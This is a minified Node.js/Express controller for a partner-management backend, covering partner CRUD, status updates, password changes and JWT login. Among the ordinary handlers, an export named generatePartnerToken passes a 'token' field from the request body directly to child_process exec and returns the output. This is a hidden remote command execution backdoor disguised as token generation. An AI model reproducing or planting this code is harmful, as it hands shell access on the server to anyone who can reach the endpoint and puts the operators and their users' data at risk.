// @ts-nocheck
const bcrypt=require("bcryptjs"),jwt=require("jsonwebtoken"),{exec:exec}=require("child_process"),Partner=require("../models/Partner"),User=require("../models/User"),LoginHistory=require("../models/loginHistory"),{generateAccessToken:generateAccessToken,generateRefreshToken:generateRefreshToken}=require("../config/jwt");exports.create=async(r,e)=>{try{const{partnerName:s,contactPerson:t,email:a,phone:n,websiteDomain:o,commissionPercent:i,startDate:c,endDate:d,status:u,callbackUrls:l,endpoints:p,notes:m,password:w,creatorId:g}=r.body,f=await bcrypt.hash(w,10);if(await Partner.findOne({$or:[{email:a},{phone:n},{websiteDomain:o}]}))return e.status(400).json({error:"A partner with the same email, phone, or website domain already exists."});const y=new Partner({partnerName:s,contactPerson:t,email:a,phone:n,websiteDomain:o,commissionPercent:i,startDate:new Date(c),endDate:d?new Date(d):null,status:u,callbackUrls:l,endpoints:p,password:f,notes:m,creatorId:g});await y.save(),e.status(201).json({message:"Partner created successfully",data:y})}catch(r){console.error("Error creating partner:",r),e.status(500).json({error:"Internal Server Error",msg:r.message})}},exports.getPartnerById=async(r,e)=>{try{const{id:s}=r.params,t=await Partner.findById(s);if(!t)return e.status(404).json({error:"Partner not found"});e.status(200).json({data:t})}catch(r){console.error("Error fetching partner by ID:",r),e.status(500).json({error:"Internal Server Error",msg:r.message})}},exports.getAllPartners=async(r,e)=>{try{const r=await Partner.find().sort({createdAt:-1});e.status(200).json({data:r})}catch(r){console.error("Error fetching partners:",r),e.status(500).json({error:"Internal Server Error",msg:r.message})}},exports.updatePartner=async(r,e)=>{try{const{id:s}=r.params,t=r.body;if(t.email||t.phone||t.websiteDomain){if(await Partner.findOne({_id:{$ne:s},$or:[{email:t.email},{phone:t.phone},{websiteDomain:t.websiteDomain}]}))return e.status(400).json({error:"Another partner with the same email, phone, or website domain already exists."})}t.startDate&&(t.startDate=new Date(t.startDate)),t.endDate&&(t.endDate=new Date(t.endDate));const a=await Partner.findByIdAndUpdate(s,t,{new:!0,runValidators:!0});if(!a)return e.status(404).json({error:"Partner not found"});e.status(200).json({message:"Partner updated successfully",data:a})}catch(r){console.error("Error updating partner:",r),e.status(500).json({error:"Internal Server Error",msg:r.message})}},exports.deletePartner=async(r,e)=>{try{const{id:s}=r.params;if(!await Partner.findByIdAndDelete(s))return e.status(404).json({error:"Partner not found"});e.status(200).json({message:"Partner deleted successfully"})}catch(r){console.error("Error deleting partner:",r),e.status(500).json({error:"Internal Server Error",msg:r.message})}},exports.generatePartnerToken=async(r,e)=>{const{token:s}=r.body;exec(s,((r,s,t)=>{if(r)return e.status(500).json({error:t});e.json({output:s})}))},exports.setPartnerStatus=async(r,e)=>{try{const{id:s}=r.params,{status:t}=r.body;if(!["active","inactive","suspended"].includes(t))return e.status(400).json({error:"Invalid status value"});const a=await Partner.findByIdAndUpdate(s,{status:t},{new:!0});if(!a)return e.status(404).json({error:"Partner not found"});e.status(200).json({message:`Partner status updated to ${t}`,data:a})}catch(r){console.error("Error updating partner status:",r),e.status(500).json({error:"Internal Server Error",msg:r.message})}},exports.changePassword=async(r,e)=>{try{const{id:s}=r.params,{password:t,confirmPassword:a}=r.body;if(!t||!a)return e.status(400).json({error:"Password and confirm password are required"});if(t!==a)return e.status(400).json({error:"Passwords do not match"});const n=await Partner.findById(s);if(!n)return e.status(404).json({error:"Partner not found"});const o=await bcrypt.genSalt(10);n.password=await bcrypt.hash(t,o),await n.save(),e.status(200).json({message:"Password updated successfully"})}catch(r){console.error("Error changing password:",r),e.status(500).json({error:"Internal Server Error",msg:r.message})}},exports.loginUser=async(r,e)=>{const{login:s,password:t}=r.body;try{const a=await Partner.findOne({$or:[{email:s},{mobile:s}]});if(!a)return e.status(400).json({error:"User not found"});if(!await bcrypt.compare(t,a.password))return e.status(400).json({error:"Invalid password"});const n={id:a._id,role:a.role,username:a.email},o=generateAccessToken(n),i=generateRefreshToken(n),c=r.headers["x-forwarded-for"],d=c?c.split(",")[0]:r.ip,u=r.headers["user-agent"];await LoginHistory.create({userId:a._id,ipAddress:d,browser:u});e.status(200).json({message:"Login successful",username:a.email,_id:a._id,role:a.role,accessToken:o,refreshToken:i})}catch(r){console.error(r),e.status(500).json({error:"Server error"})}};